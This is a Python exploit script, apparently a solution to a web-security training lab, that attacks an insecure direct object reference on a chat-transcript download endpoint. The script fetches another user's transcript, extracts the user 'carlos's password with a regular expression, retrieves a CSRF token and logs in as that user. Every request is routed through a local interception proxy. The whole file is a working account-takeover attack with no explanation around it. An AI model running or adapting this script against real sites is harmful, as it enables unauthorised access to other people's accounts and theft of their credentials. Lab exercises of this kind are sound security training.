import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def get_csrf_token(session, login_url):
    res = session.get(login_url, verify=False, proxies=proxies)
    soup = BeautifulSoup(res.text, "html.parser")
    csrf = soup.find("input", {'name': 'csrf'})["value"]
    return csrf

def log_as_carlos(session, url):
    # Get chat transcript and password
    print("(+) Attempting to get carlos password.")
    chat_transcript_url = url + "/download-transcript/1.txt"
    res = session.get(chat_transcript_url, verify=False, proxies=proxies)
    if "password" in res.text:
        print("(+) Found carlos's password.")
        print("(+) Retrieving carlos password.")
        carlos_password = re.findall(r"You: Ok so my password is (.*). Is that right", res.text)[0]
        print(f"(+) Carlos password is: {carlos_password}")

        # Getting csrf token
        login_url = url + "/login"
        csrf_token = get_csrf_token(session, login_url)

        # Logging as carlos
        login_data = {'csrf': csrf_token, 'username': 'carlos', 'password': carlos_password}

        res = session.post(login_url, data=login_data, verify=False, proxies=proxies)

        if "Log out" in res.text:
            print("(+) Successfully logged in as carlos user.")
        else:
            print("(-) Could not login as the carlos user.")
            sys.exit(-1)

    else:
        print("(-) Could not found carlos password")
        sys.exit(-1)
    

def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} https://www.example.com")
        sys.exit(-1)

    session = requests.session()
    url = sys.argv[1].strip()
    log_as_carlos(session, url)

if __name__ == "__main__":
    main()